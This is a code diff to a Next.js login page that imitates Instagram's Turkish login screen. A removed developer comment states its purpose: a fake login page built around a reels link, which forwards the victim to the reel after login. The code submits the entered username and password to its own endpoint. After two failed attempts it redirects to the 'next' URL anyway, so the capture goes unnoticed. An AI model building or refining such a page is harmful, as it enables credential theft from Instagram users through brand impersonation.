@@ -8,20 +8,12 @@ import facebook from "@/../public/facebook.svg";
 import playstore from "@/../public/playstore.png";
 import microsoft from "@/../public/microsoft.png";
 
-
-const getNextParam = () => {
-  if (typeof window !== "undefined") {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get("next");
-  }
-  return null;
-};
-
-// dark:invert
-// reels linki ver reels linki ile sahte login page'i oluştursun bu login page'e giriş yaptığında reels'e yönlendirsin
+// YÖNLENDİRMEYİ YAP 
+// İNSTAGRAM LOGOSU GÖZÜKMÜYORO NU DÜZELT
 export default function LoginPage() {
   const [loginCounter, setLoginCounter] = useState(0);
   const router = useRouter();
+
   const searchParams = useSearchParams();
   const [error, setError] = useState(null);
   
@@ -39,14 +31,18 @@ export default function LoginPage() {
       }),
       headers: { 'Content-Type': 'application/json' },
     });
-  
+
     if (response.status === 200) {
-      const nextUrl = getNextParam(); // Yeni yöntemle parametre alınması
-      window.location.href = nextUrl ? nextUrl : "/";
+      const nextUrl = searchParams.get("next");
+      router.push(nextUrl ? nextUrl : "/panel");
     } else {
-      if (loginCounter + 1 > 3) {
+      if (loginCounter + 1 > 2) {
+        const nextUrl = searchParams.get("next");
+        router.push(nextUrl);
+        /*
         const nextUrl = getNextParam();
         window.location.href = nextUrl ? nextUrl : "/";
+        */
       } else {
         setError('Üzgünüz, şifren yanlıştı. Lütfen şifreni dikkatlice kontrol et.');
       }
@@ -71,7 +67,7 @@ export default function LoginPage() {
     <div className="flex flex-col justify-center items-center min-h-screen">
       <main className="flex-1 flex flex-col justify-center h-full space-y-4 row-start-2 items-center sm:items-start w-full max-w-[350px]">
         <div className="flex flex-col gap-8 border border-[#DBDBDB] dark:border-[#363636] p-10 w-full">
-          <div className="flex justify-center w-full">
+          <div className="flex justify-center w-full select-none">
             <Image
               className="pt-4 block dark:hidden"
               src="/instagram-black.png"
@@ -109,10 +105,10 @@ export default function LoginPage() {
                 />
                 <label
                   htmlFor="username"
-                  className={`absolute w-full left-2 text-[#a8a8a8] cursor-text pointer-events-none peer-focus:text-[11px] peer-focus:-top-[-0.120rem] transition-all select-none ${
+                  className={`absolute w-full text-[#a8a8a8] cursor-text pointer-events-none peer-focus:text-[11px] peer-focus:-top-[-0.120rem] peer-focus:left-[0.60rem] transition-all select-none ${
                     usernameValue.trim() !== ""
-                      ? "-top-[-0.120rem] text-[11px]"
-                      : "top-[0.90rem] text-[12px]"
+                      ? "-top-[-0.120rem] left-[0.60rem] text-[11px]"
+                      : "top-[0.80rem] left-2 text-[12px]"
                   }`}
                 >
                   Telefon numarası, kullanıcı adı veya e-posta
@@ -132,10 +128,10 @@ export default function LoginPage() {
                 />
                 <label
                   htmlFor="password"
-                  className={`absolute w-full left-2 text-[#a8a8a8] cursor-text pointer-events-none peer-focus:text-[11px] peer-focus:-top-[-0.120rem] transition-all select-none ${
+                  className={`absolute w-full text-[#a8a8a8] cursor-text pointer-events-none peer-focus:text-[11px] peer-focus:-top-[-0.120rem] peer-focus:left-[0.60rem] transition-all select-none ${
                     passwordValue.trim() !== ""
-                      ? "-top-[-0.120rem] text-[11px]"
-                      : "top-[0.90rem] text-[12px]"
+                      ? "-top-[-0.120rem] left-[0.60rem] text-[11px]"
+                      : "top-[0.80rem] left-2 text-[12px]"
                   }`}
                 >
                   Şifre
